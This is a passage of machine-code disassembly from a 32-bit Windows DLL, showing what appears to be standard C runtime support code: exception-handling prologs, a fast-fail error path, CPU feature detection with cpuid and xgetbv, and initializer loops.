10002479:	b9 00 00 00 10       	mov    $0x10000000,%ecx
1000247e:	2b c1                	sub    %ecx,%eax
10002480:	50                   	push   %eax
10002481:	51                   	push   %ecx
10002482:	e8 b3 fd ff ff       	call   0x1000223a
10002487:	59                   	pop    %ecx
10002488:	59                   	pop    %ecx
10002489:	85 c0                	test   %eax,%eax
1000248b:	74 27                	je     0x100024b4
1000248d:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
10002491:	7c 21                	jl     0x100024b4
10002493:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
1000249a:	b0 01                	mov    $0x1,%al
1000249c:	eb 1f                	jmp    0x100024bd
1000249e:	8b 45 ec             	mov    -0x14(%ebp),%eax
100024a1:	8b 00                	mov    (%eax),%eax
100024a3:	33 c9                	xor    %ecx,%ecx
100024a5:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
100024ab:	0f 94 c1             	sete   %cl
100024ae:	8b c1                	mov    %ecx,%eax
100024b0:	c3                   	ret
100024b1:	8b 65 e8             	mov    -0x18(%ebp),%esp
100024b4:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100024bb:	32 c0                	xor    %al,%al
100024bd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100024c0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100024c7:	59                   	pop    %ecx
100024c8:	5f                   	pop    %edi
100024c9:	5e                   	pop    %esi
100024ca:	5b                   	pop    %ebx
100024cb:	c9                   	leave
100024cc:	c3                   	ret
100024cd:	55                   	push   %ebp
100024ce:	8b ec                	mov    %esp,%ebp
100024d0:	e8 11 05 00 00       	call   0x100029e6
100024d5:	85 c0                	test   %eax,%eax
100024d7:	74 0f                	je     0x100024e8
100024d9:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
100024dd:	75 09                	jne    0x100024e8
100024df:	33 c0                	xor    %eax,%eax
100024e1:	b9 44 40 01 10       	mov    $0x10014044,%ecx
100024e6:	87 01                	xchg   %eax,(%ecx)
100024e8:	5d                   	pop    %ebp
100024e9:	c3                   	ret
100024ea:	55                   	push   %ebp
100024eb:	8b ec                	mov    %esp,%ebp
100024ed:	80 3d 48 40 01 10 00 	cmpb   $0x0,0x10014048
100024f4:	74 06                	je     0x100024fc
100024f6:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
100024fa:	75 12                	jne    0x1000250e
100024fc:	ff 75 08             	push   0x8(%ebp)
100024ff:	e8 cb 2c 00 00       	call   0x100051cf
10002504:	ff 75 08             	push   0x8(%ebp)
10002507:	e8 1a 07 00 00       	call   0x10002c26
1000250c:	59                   	pop    %ecx
1000250d:	59                   	pop    %ecx
1000250e:	b0 01                	mov    $0x1,%al
10002510:	5d                   	pop    %ebp
10002511:	c3                   	ret
10002512:	b8 84 47 01 10       	mov    $0x10014784,%eax
10002517:	c3                   	ret
10002518:	55                   	push   %ebp
10002519:	8b ec                	mov    %esp,%ebp
1000251b:	81 ec 24 03 00 00    	sub    $0x324,%esp
10002521:	53                   	push   %ebx
10002522:	6a 17                	push   $0x17
10002524:	e8 fa 04 00 00       	call   0x10002a23
10002529:	85 c0                	test   %eax,%eax
1000252b:	74 05                	je     0x10002532
1000252d:	8b 4d 08             	mov    0x8(%ebp),%ecx
10002530:	cd 29                	int    $0x29
10002532:	6a 03                	push   $0x3
10002534:	e8 f9 00 00 00       	call   0x10002632
10002539:	c7 04 24 cc 02 00 00 	movl   $0x2cc,(%esp)
10002540:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
10002546:	6a 00                	push   $0x0
10002548:	50                   	push   %eax
10002549:	e8 02 08 00 00       	call   0x10002d50
1000254e:	83 c4 0c             	add    $0xc,%esp
10002551:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
10002557:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
1000255d:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
10002563:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
10002569:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
1000256f:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
10002575:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
1000257c:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
10002583:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
1000258a:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
10002591:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
10002598:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
1000259f:	9c                   	pushf
100025a0:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
100025a6:	8b 45 04             	mov    0x4(%ebp),%eax
100025a9:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
100025af:	8d 45 04             	lea    0x4(%ebp),%eax
100025b2:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
100025b8:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
100025bf:	00 01 00 
100025c2:	8b 40 fc             	mov    -0x4(%eax),%eax
100025c5:	6a 50                	push   $0x50
100025c7:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
100025cd:	8d 45 a8             	lea    -0x58(%ebp),%eax
100025d0:	6a 00                	push   $0x0
100025d2:	50                   	push   %eax
100025d3:	e8 78 07 00 00       	call   0x10002d50
100025d8:	8b 45 04             	mov    0x4(%ebp),%eax
100025db:	83 c4 0c             	add    $0xc,%esp
100025de:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
100025e5:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
100025ec:	89 45 b4             	mov    %eax,-0x4c(%ebp)
100025ef:	ff 15 7c d0 00 10    	call   *0x1000d07c
100025f5:	6a 00                	push   $0x0
100025f7:	8d 58 ff             	lea    -0x1(%eax),%ebx
100025fa:	f7 db                	neg    %ebx
100025fc:	8d 45 a8             	lea    -0x58(%ebp),%eax
100025ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002602:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
10002608:	1a db                	sbb    %bl,%bl
1000260a:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000260d:	fe c3                	inc    %bl
1000260f:	ff 15 58 d0 00 10    	call   *0x1000d058
10002615:	8d 45 f8             	lea    -0x8(%ebp),%eax
10002618:	50                   	push   %eax
10002619:	ff 15 54 d0 00 10    	call   *0x1000d054
1000261f:	85 c0                	test   %eax,%eax
10002621:	75 0c                	jne    0x1000262f
10002623:	84 db                	test   %bl,%bl
10002625:	75 08                	jne    0x1000262f
10002627:	6a 03                	push   $0x3
10002629:	e8 04 00 00 00       	call   0x10002632
1000262e:	59                   	pop    %ecx
1000262f:	5b                   	pop    %ebx
10002630:	c9                   	leave
10002631:	c3                   	ret
10002632:	83 25 64 40 01 10 00 	andl   $0x0,0x10014064
10002639:	c3                   	ret
1000263a:	53                   	push   %ebx
1000263b:	56                   	push   %esi
1000263c:	be 34 22 01 10       	mov    $0x10012234,%esi
10002641:	bb 34 22 01 10       	mov    $0x10012234,%ebx
10002646:	3b f3                	cmp    %ebx,%esi
10002648:	73 19                	jae    0x10002663
1000264a:	57                   	push   %edi
1000264b:	8b 3e                	mov    (%esi),%edi
1000264d:	85 ff                	test   %edi,%edi
1000264f:	74 0a                	je     0x1000265b
10002651:	8b cf                	mov    %edi,%ecx
10002653:	ff 15 5c d1 00 10    	call   *0x1000d15c
10002659:	ff d7                	call   *%edi
1000265b:	83 c6 04             	add    $0x4,%esi
1000265e:	3b f3                	cmp    %ebx,%esi
10002660:	72 e9                	jb     0x1000264b
10002662:	5f                   	pop    %edi
10002663:	5e                   	pop    %esi
10002664:	5b                   	pop    %ebx
10002665:	c3                   	ret
10002666:	53                   	push   %ebx
10002667:	56                   	push   %esi
10002668:	be 3c 22 01 10       	mov    $0x1001223c,%esi
1000266d:	bb 3c 22 01 10       	mov    $0x1001223c,%ebx
10002672:	3b f3                	cmp    %ebx,%esi
10002674:	73 19                	jae    0x1000268f
10002676:	57                   	push   %edi
10002677:	8b 3e                	mov    (%esi),%edi
10002679:	85 ff                	test   %edi,%edi
1000267b:	74 0a                	je     0x10002687
1000267d:	8b cf                	mov    %edi,%ecx
1000267f:	ff 15 5c d1 00 10    	call   *0x1000d15c
10002685:	ff d7                	call   *%edi
10002687:	83 c6 04             	add    $0x4,%esi
1000268a:	3b f3                	cmp    %ebx,%esi
1000268c:	72 e9                	jb     0x10002677
1000268e:	5f                   	pop    %edi
1000268f:	5e                   	pop    %esi
10002690:	5b                   	pop    %ebx
10002691:	c3                   	ret
10002692:	cc                   	int3
10002693:	cc                   	int3
10002694:	cc                   	int3
10002695:	cc                   	int3
10002696:	cc                   	int3
10002697:	cc                   	int3
10002698:	cc                   	int3
10002699:	cc                   	int3
1000269a:	cc                   	int3
1000269b:	cc                   	int3
1000269c:	cc                   	int3
1000269d:	cc                   	int3
1000269e:	cc                   	int3
1000269f:	cc                   	int3
100026a0:	68 70 2a 00 10       	push   $0x10002a70
100026a5:	67 64 ff 36 00 00    	push   %fs:0x0
100026ab:	8b 44 24 10          	mov    0x10(%esp),%eax
100026af:	89 6c 24 10          	mov    %ebp,0x10(%esp)
100026b3:	8d 6c 24 10          	lea    0x10(%esp),%ebp
100026b7:	2b e0                	sub    %eax,%esp
100026b9:	53                   	push   %ebx
100026ba:	56                   	push   %esi
100026bb:	57                   	push   %edi
100026bc:	a1 04 30 01 10       	mov    0x10013004,%eax
100026c1:	31 45 fc             	xor    %eax,-0x4(%ebp)
100026c4:	33 c5                	xor    %ebp,%eax
100026c6:	50                   	push   %eax
100026c7:	89 65 e8             	mov    %esp,-0x18(%ebp)
100026ca:	ff 75 f8             	push   -0x8(%ebp)
100026cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
100026d0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100026d7:	89 45 f8             	mov    %eax,-0x8(%ebp)
100026da:	8d 45 f0             	lea    -0x10(%ebp),%eax
100026dd:	67 64 a3 00 00       	addr16 mov %eax,%fs:0x0
100026e2:	f2 c3                	bnd ret
100026e4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100026e7:	67 64 89 0e 00 00    	mov    %ecx,%fs:0x0
100026ed:	59                   	pop    %ecx
100026ee:	5f                   	pop    %edi
100026ef:	5f                   	pop    %edi
100026f0:	5e                   	pop    %esi
100026f1:	5b                   	pop    %ebx
100026f2:	8b e5                	mov    %ebp,%esp
100026f4:	5d                   	pop    %ebp
100026f5:	51                   	push   %ecx
100026f6:	f2 c3                	bnd ret
100026f8:	c2 00 00             	ret    $0x0
100026fb:	55                   	push   %ebp
100026fc:	8b ec                	mov    %esp,%ebp
100026fe:	56                   	push   %esi
100026ff:	ff 75 08             	push   0x8(%ebp)
10002702:	8b f1                	mov    %ecx,%esi
10002704:	e8 58 00 00 00       	call   0x10002761
10002709:	c7 06 d0 d1 00 10    	movl   $0x1000d1d0,(%esi)
1000270f:	8b c6                	mov    %esi,%eax
10002711:	5e                   	pop    %esi
10002712:	5d                   	pop    %ebp
10002713:	c2 04 00             	ret    $0x4
10002716:	83 61 04 00          	andl   $0x0,0x4(%ecx)
1000271a:	8b c1                	mov    %ecx,%eax
1000271c:	83 61 08 00          	andl   $0x0,0x8(%ecx)
10002720:	c7 41 04 d8 d1 00 10 	movl   $0x1000d1d8,0x4(%ecx)
10002727:	c7 01 d0 d1 00 10    	movl   $0x1000d1d0,(%ecx)
1000272d:	c3                   	ret
1000272e:	55                   	push   %ebp
1000272f:	8b ec                	mov    %esp,%ebp
10002731:	56                   	push   %esi
10002732:	ff 75 08             	push   0x8(%ebp)
10002735:	8b f1                	mov    %ecx,%esi
10002737:	e8 25 00 00 00       	call   0x10002761
1000273c:	c7 06 ec d1 00 10    	movl   $0x1000d1ec,(%esi)
10002742:	8b c6                	mov    %esi,%eax
10002744:	5e                   	pop    %esi
10002745:	5d                   	pop    %ebp
10002746:	c2 04 00             	ret    $0x4
10002749:	83 61 04 00          	andl   $0x0,0x4(%ecx)
1000274d:	8b c1                	mov    %ecx,%eax
1000274f:	83 61 08 00          	andl   $0x0,0x8(%ecx)
10002753:	c7 41 04 f4 d1 00 10 	movl   $0x1000d1f4,0x4(%ecx)
1000275a:	c7 01 ec d1 00 10    	movl   $0x1000d1ec,(%ecx)
10002760:	c3                   	ret
10002761:	55                   	push   %ebp
10002762:	8b ec                	mov    %esp,%ebp
10002764:	56                   	push   %esi
10002765:	8b f1                	mov    %ecx,%esi
10002767:	8d 46 04             	lea    0x4(%esi),%eax
1000276a:	c7 06 b0 d1 00 10    	movl   $0x1000d1b0,(%esi)
10002770:	83 20 00             	andl   $0x0,(%eax)
10002773:	83 60 04 00          	andl   $0x0,0x4(%eax)
10002777:	50                   	push   %eax
10002778:	8b 45 08             	mov    0x8(%ebp),%eax
1000277b:	83 c0 04             	add    $0x4,%eax
1000277e:	50                   	push   %eax
1000277f:	e8 26 07 00 00       	call   0x10002eaa
10002784:	59                   	pop    %ecx
10002785:	59                   	pop    %ecx
10002786:	8b c6                	mov    %esi,%eax
10002788:	5e                   	pop    %esi
10002789:	5d                   	pop    %ebp
1000278a:	c2 04 00             	ret    $0x4
1000278d:	8d 41 04             	lea    0x4(%ecx),%eax
10002790:	c7 01 b0 d1 00 10    	movl   $0x1000d1b0,(%ecx)
10002796:	50                   	push   %eax
10002797:	e8 71 07 00 00       	call   0x10002f0d
1000279c:	59                   	pop    %ecx
1000279d:	c3                   	ret
1000279e:	55                   	push   %ebp
1000279f:	8b ec                	mov    %esp,%ebp
100027a1:	56                   	push   %esi
100027a2:	8b f1                	mov    %ecx,%esi
100027a4:	8d 46 04             	lea    0x4(%esi),%eax
100027a7:	c7 06 b0 d1 00 10    	movl   $0x1000d1b0,(%esi)
100027ad:	50                   	push   %eax
100027ae:	e8 5a 07 00 00       	call   0x10002f0d
100027b3:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
100027b7:	59                   	pop    %ecx
100027b8:	74 0a                	je     0x100027c4
100027ba:	6a 0c                	push   $0xc
100027bc:	56                   	push   %esi
100027bd:	e8 30 02 00 00       	call   0x100029f2
100027c2:	59                   	pop    %ecx
100027c3:	59                   	pop    %ecx
100027c4:	8b c6                	mov    %esi,%eax
100027c6:	5e                   	pop    %esi
100027c7:	5d                   	pop    %ebp
100027c8:	c2 04 00             	ret    $0x4
100027cb:	55                   	push   %ebp
100027cc:	8b ec                	mov    %esp,%ebp
100027ce:	83 ec 0c             	sub    $0xc,%esp
100027d1:	8d 4d f4             	lea    -0xc(%ebp),%ecx
100027d4:	e8 3d ff ff ff       	call   0x10002716
100027d9:	68 c4 22 01 10       	push   $0x100122c4
100027de:	8d 45 f4             	lea    -0xc(%ebp),%eax
100027e1:	50                   	push   %eax
100027e2:	e8 45 07 00 00       	call   0x10002f2c
100027e7:	cc                   	int3
100027e8:	55                   	push   %ebp
100027e9:	8b ec                	mov    %esp,%ebp
100027eb:	83 ec 0c             	sub    $0xc,%esp
100027ee:	8d 4d f4             	lea    -0xc(%ebp),%ecx
100027f1:	e8 53 ff ff ff       	call   0x10002749
100027f6:	68 18 23 01 10       	push   $0x10012318
100027fb:	8d 45 f4             	lea    -0xc(%ebp),%eax
100027fe:	50                   	push   %eax
100027ff:	e8 28 07 00 00       	call   0x10002f2c
10002804:	cc                   	int3
10002805:	8b 41 04             	mov    0x4(%ecx),%eax
10002808:	85 c0                	test   %eax,%eax
1000280a:	75 05                	jne    0x10002811
1000280c:	b8 b8 d1 00 10       	mov    $0x1000d1b8,%eax
10002811:	c3                   	ret
10002812:	55                   	push   %ebp
10002813:	8b ec                	mov    %esp,%ebp
10002815:	83 25 68 40 01 10 00 	andl   $0x0,0x10014068
1000281c:	83 ec 24             	sub    $0x24,%esp
1000281f:	83 0d 10 30 01 10 01 	orl    $0x1,0x10013010
10002826:	6a 0a                	push   $0xa
10002828:	e8 f6 01 00 00       	call   0x10002a23
1000282d:	85 c0                	test   %eax,%eax
1000282f:	0f 84 a9 01 00 00    	je     0x100029de
10002835:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
10002839:	33 c0                	xor    %eax,%eax
1000283b:	53                   	push   %ebx
1000283c:	56                   	push   %esi
1000283d:	57                   	push   %edi
1000283e:	33 c9                	xor    %ecx,%ecx
10002840:	8d 7d dc             	lea    -0x24(%ebp),%edi
10002843:	53                   	push   %ebx
10002844:	0f a2                	cpuid
10002846:	8b f3                	mov    %ebx,%esi
10002848:	5b                   	pop    %ebx
10002849:	89 07                	mov    %eax,(%edi)
1000284b:	89 77 04             	mov    %esi,0x4(%edi)
1000284e:	89 4f 08             	mov    %ecx,0x8(%edi)
10002851:	33 c9                	xor    %ecx,%ecx
10002853:	89 57 0c             	mov    %edx,0xc(%edi)
10002856:	8b 45 dc             	mov    -0x24(%ebp),%eax
10002859:	8b 7d e4             	mov    -0x1c(%ebp),%edi
1000285c:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000285f:	81 f7 6e 74 65 6c    	xor    $0x6c65746e,%edi
10002865:	8b 45 e8             	mov    -0x18(%ebp),%eax
10002868:	35 69 6e 65 49       	xor    $0x49656e69,%eax
1000286d:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002870:	8b 45 e0             	mov    -0x20(%ebp),%eax
10002873:	35 47 65 6e 75       	xor    $0x756e6547,%eax
10002878:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000287b:	33 c0                	xor    %eax,%eax
1000287d:	40                   	inc    %eax
1000287e:	53                   	push   %ebx
1000287f:	0f a2                	cpuid
10002881:	8b f3                	mov    %ebx,%esi
10002883:	5b                   	pop    %ebx
10002884:	8d 5d dc             	lea    -0x24(%ebp),%ebx
10002887:	89 03                	mov    %eax,(%ebx)
10002889:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000288c:	89 73 04             	mov    %esi,0x4(%ebx)
1000288f:	0b c7                	or     %edi,%eax
10002891:	0b 45 f8             	or     -0x8(%ebp),%eax
10002894:	89 4b 08             	mov    %ecx,0x8(%ebx)
10002897:	89 53 0c             	mov    %edx,0xc(%ebx)
1000289a:	75 43                	jne    0x100028df
1000289c:	8b 45 dc             	mov    -0x24(%ebp),%eax
1000289f:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
100028a4:	3d c0 06 01 00       	cmp    $0x106c0,%eax
100028a9:	74 23                	je     0x100028ce
100028ab:	3d 60 06 02 00       	cmp    $0x20660,%eax
100028b0:	74 1c                	je     0x100028ce
100028b2:	3d 70 06 02 00       	cmp    $0x20670,%eax
100028b7:	74 15                	je     0x100028ce
100028b9:	3d 50 06 03 00       	cmp    $0x30650,%eax
100028be:	74 0e                	je     0x100028ce
100028c0:	3d 60 06 03 00       	cmp    $0x30660,%eax
100028c5:	74 07                	je     0x100028ce
100028c7:	3d 70 06 03 00       	cmp    $0x30670,%eax
100028cc:	75 11                	jne    0x100028df
100028ce:	8b 3d 6c 40 01 10    	mov    0x1001406c,%edi
100028d4:	83 cf 01             	or     $0x1,%edi
100028d7:	89 3d 6c 40 01 10    	mov    %edi,0x1001406c
100028dd:	eb 06                	jmp    0x100028e5
100028df:	8b 3d 6c 40 01 10    	mov    0x1001406c,%edi
100028e5:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
100028e8:	6a 07                	push   $0x7
100028ea:	58                   	pop    %eax
100028eb:	89 4d fc             	mov    %ecx,-0x4(%ebp)
100028ee:	39 45 f4             	cmp    %eax,-0xc(%ebp)
100028f1:	7c 2f                	jl     0x10002922
100028f3:	33 c9                	xor    %ecx,%ecx
100028f5:	53                   	push   %ebx
100028f6:	0f a2                	cpuid
100028f8:	8b f3                	mov    %ebx,%esi
100028fa:	5b                   	pop    %ebx
100028fb:	8d 5d dc             	lea    -0x24(%ebp),%ebx
100028fe:	89 03                	mov    %eax,(%ebx)
10002900:	89 73 04             	mov    %esi,0x4(%ebx)
10002903:	89 4b 08             	mov    %ecx,0x8(%ebx)
10002906:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10002909:	89 53 0c             	mov    %edx,0xc(%ebx)
1000290c:	8b 5d e0             	mov    -0x20(%ebp),%ebx
1000290f:	f7 c3 00 02 00 00    	test   $0x200,%ebx
10002915:	74 0e                	je     0x10002925
10002917:	83 cf 02             	or     $0x2,%edi
1000291a:	89 3d 6c 40 01 10    	mov    %edi,0x1001406c
10002920:	eb 03                	jmp    0x10002925
10002922:	8b 5d f0             	mov    -0x10(%ebp),%ebx
10002925:	a1 10 30 01 10       	mov    0x10013010,%eax
1000292a:	83 c8 02             	or     $0x2,%eax
1000292d:	c7 05 68 40 01 10 01 	movl   $0x1,0x10014068
10002934:	00 00 00 
10002937:	a3 10 30 01 10       	mov    %eax,0x10013010
1000293c:	f7 c1 00 00 10 00    	test   $0x100000,%ecx
10002942:	0f 84 93 00 00 00    	je     0x100029db
10002948:	83 c8 04             	or     $0x4,%eax
1000294b:	c7 05 68 40 01 10 02 	movl   $0x2,0x10014068
10002952:	00 00 00 
10002955:	a3 10 30 01 10       	mov    %eax,0x10013010
1000295a:	f7 c1 00 00 00 08    	test   $0x8000000,%ecx
10002960:	74 79                	je     0x100029db
10002962:	f7 c1 00 00 00 10    	test   $0x10000000,%ecx
10002968:	74 71                	je     0x100029db
1000296a:	33 c9                	xor    %ecx,%ecx
1000296c:	0f 01 d0             	xgetbv
1000296f:	89 45 ec             	mov    %eax,-0x14(%ebp)
10002972:	89 55 f0             	mov    %edx,-0x10(%ebp)
10002975:	8b 45 ec             	mov    -0x14(%ebp),%eax
10002978:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000297b:	6a 06                	push   $0x6
1000297d:	5e                   	pop    %esi
1000297e:	23 c6                	and    %esi,%eax
10002980:	3b c6                	cmp    %esi,%eax
10002982:	75 57                	jne    0x100029db
10002984:	a1 10 30 01 10       	mov    0x10013010,%eax
10002989:	83 c8 08             	or     $0x8,%eax
1000298c:	c7 05 68 40 01 10 03 	movl   $0x3,0x10014068
10002993:	00 00 00 
10002996:	a3 10 30 01 10       	mov    %eax,0x10013010
1000299b:	f6 c3 20             	test   $0x20,%bl
1000299e:	74 3b                	je     0x100029db
100029a0:	83 c8 20             	or     $0x20,%eax
100029a3:	c7 05 68 40 01 10 05 	movl   $0x5,0x10014068
100029aa:	00 00 00 
100029ad:	a3 10 30 01 10       	mov    %eax,0x10013010
100029b2:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
100029b7:	23 d8                	and    %eax,%ebx
100029b9:	3b d8                	cmp    %eax,%ebx
100029bb:	75 1e                	jne    0x100029db
100029bd:	8b 45 ec             	mov    -0x14(%ebp),%eax
100029c0:	ba e0 00 00 00       	mov    $0xe0,%edx
100029c5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100029c8:	23 c2                	and    %edx,%eax
100029ca:	3b c2                	cmp    %edx,%eax
100029cc:	75 0d                	jne    0x100029db
100029ce:	83 0d 10 30 01 10 40 	orl    $0x40,0x10013010
100029d5:	89 35 68 40 01 10    	mov    %esi,0x10014068
100029db:	5f                   	pop    %edi
100029dc:	5e                   	pop    %esi
100029dd:	5b                   	pop    %ebx
100029de:	33 c0                	xor    %eax,%eax
100029e0:	c9                   	leave
100029e1:	c3                   	ret
100029e2:	33 c0                	xor    %eax,%eax
100029e4:	40                   	inc    %eax
100029e5:	c3                   	ret
100029e6:	33 c0                	xor    %eax,%eax
100029e8:	39 05 80 47 01 10    	cmp    %eax,0x10014780
100029ee:	0f 95 c0             	setne  %al
100029f1:	c3                   	ret
100029f2:	55                   	push   %ebp
100029f3:	8b ec                	mov    %esp,%ebp
100029f5:	ff 75 08             	push   0x8(%ebp)
100029f8:	e8 2f f7 ff ff       	call   0x1000212c
100029fd:	59                   	pop    %ecx
100029fe:	5d                   	pop    %ebp
100029ff:	c3                   	ret
10002a00:	55                   	push   %ebp
10002a01:	8b ec                	mov    %esp,%ebp
10002a03:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
10002a07:	56                   	push   %esi
10002a08:	8b f1                	mov    %ecx,%esi
10002a0a:	c7 06 10 d2 00 10    	movl   $0x1000d210,(%esi)
10002a10:	74 0a                	je     0x10002a1c
10002a12:	6a 0c                	push   $0xc
10002a14:	56                   	push   %esi
10002a15:	e8 d8 ff ff ff       	call   0x100029f2
10002a1a:	59                   	pop    %ecx
10002a1b:	59                   	pop    %ecx
10002a1c:	8b c6                	mov    %esi,%eax
10002a1e:	5e                   	pop    %esi
10002a1f:	5d                   	pop    %ebp
10002a20:	c2 04 00             	ret    $0x4
10002a23:	ff 25 64 d0 00 10    	jmp    *0x1000d064
10002a29:	cc                   	int3
10002a2a:	cc                   	int3
10002a2b:	cc                   	int3
10002a2c:	cc                   	int3
10002a2d:	cc                   	int3
10002a2e:	cc                   	int3
10002a2f:	cc                   	int3
10002a30:	55                   	push   %ebp
10002a31:	8b ec                	mov    %esp,%ebp
10002a33:	56                   	push   %esi
10002a34:	8b 75 08             	mov    0x8(%ebp),%esi
10002a37:	57                   	push   %edi
10002a38:	8b 7d 0c             	mov    0xc(%ebp),%edi
10002a3b:	8b 06                	mov    (%esi),%eax
10002a3d:	83 f8 fe             	cmp    $0xfffffffe,%eax
10002a40:	74 0d                	je     0x10002a4f
10002a42:	8b 4e 04             	mov    0x4(%esi),%ecx
10002a45:	03 cf                	add    %edi,%ecx
10002a47:	33 0c 38             	xor    (%eax,%edi,1),%ecx
10002a4a:	e8 3a f2 ff ff       	call   0x10001c89
10002a4f:	8b 46 08             	mov    0x8(%esi),%eax
10002a52:	8b 4e 0c             	mov    0xc(%esi),%ecx
10002a55:	03 cf                	add    %edi,%ecx
10002a57:	33 0c 38             	xor    (%eax,%edi,1),%ecx
10002a5a:	5f                   	pop    %edi
10002a5b:	5e                   	pop    %esi
10002a5c:	5d                   	pop    %ebp
10002a5d:	e9 27 f2 ff ff       	jmp    0x10001c89
10002a62:	cc                   	int3
10002a63:	cc                   	int3
10002a64:	cc                   	int3
10002a65:	cc                   	int3
10002a66:	cc                   	int3
10002a67:	cc                   	int3
10002a68:	cc                   	int3
10002a69:	cc                   	int3
10002a6a:	cc                   	int3
10002a6b:	cc                   	int3
10002a6c:	cc                   	int3
10002a6d:	cc                   	int3
10002a6e:	cc                   	int3
10002a6f:	cc                   	int3
10002a70:	55                   	push   %ebp
10002a71:	8b ec                	mov    %esp,%ebp
10002a73:	83 ec 1c             	sub    $0x1c,%esp
10002a76:	53                   	push   %ebx
10002a77:	8b 5d 08             	mov    0x8(%ebp),%ebx
10002a7a:	56                   	push   %esi
10002a7b:	57                   	push   %edi
10002a7c:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
10002a80:	ff 33                	push   (%ebx)
10002a82:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
10002a89:	e8 9d a2 00 00       	call   0x1000cd2b
10002a8e:	89 03                	mov    %eax,(%ebx)
10002a90:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10002a93:	8b 43 08             	mov    0x8(%ebx),%eax
10002a96:	8d 73 10             	lea    0x10(%ebx),%esi
10002a99:	33 05 04 30 01 10    	xor    0x10013004,%eax
10002a9f:	56                   	push   %esi
10002aa0:	50                   	push   %eax
10002aa1:	89 75 f0             	mov    %esi,-0x10(%ebp)
10002aa4:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002aa7:	e8 84 ff ff ff       	call   0x10002a30
10002aac:	ff 75 10             	push   0x10(%ebp)
10002aaf:	e8 4f 06 00 00       	call   0x10003103
10002ab4:	8b 45 08             	mov    0x8(%ebp),%eax
10002ab7:	83 c4 10             	add    $0x10,%esp
10002aba:	8b 7b 0c             	mov    0xc(%ebx),%edi
10002abd:	f6 40 04 66          	testb  $0x66,0x4(%eax)
10002ac1:	75 5a                	jne    0x10002b1d
10002ac3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002ac6:	8b 45 10             	mov    0x10(%ebp),%eax
10002ac9:	89 45 e8             	mov    %eax,-0x18(%ebp)
10002acc:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10002acf:	89 43 fc             	mov    %eax,-0x4(%ebx)
10002ad2:	83 ff fe             	cmp    $0xfffffffe,%edi
10002ad5:	74 69                	je     0x10002b40
10002ad7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
10002ada:	8d 47 02             	lea    0x2(%edi),%eax
10002add:	8d 04 47             	lea    (%edi,%eax,2),%eax
10002ae0:	8b 1c 81             	mov    (%ecx,%eax,4),%ebx
10002ae3:	8d 04 81             	lea    (%ecx,%eax,4),%eax
10002ae6:	8b 48 04             	mov    0x4(%eax),%ecx
10002ae9:	89 45 ec             	mov    %eax,-0x14(%ebp)
10002aec:	85 c9                	test   %ecx,%ecx
10002aee:	74 14                	je     0x10002b04
10002af0:	8b d6                	mov    %esi,%edx
10002af2:	e8 a5 05 00 00       	call   0x1000309c
10002af7:	b1 01                	mov    $0x1,%cl
10002af9:	88 4d ff             	mov    %cl,-0x1(%ebp)
10002afc:	85 c0                	test   %eax,%eax
10002afe:	78 14                	js     0x10002b14
10002b00:	7f 48                	jg     0x10002b4a
10002b02:	eb 03                	jmp    0x10002b07
10002b04:	8a 4d ff             	mov    -0x1(%ebp),%cl
10002b07:	8b fb                	mov    %ebx,%edi
10002b09:	83 fb fe             	cmp    $0xfffffffe,%ebx
10002b0c:	75 c9                	jne    0x10002ad7
10002b0e:	84 c9                	test   %cl,%cl
10002b10:	74 2e                	je     0x10002b40
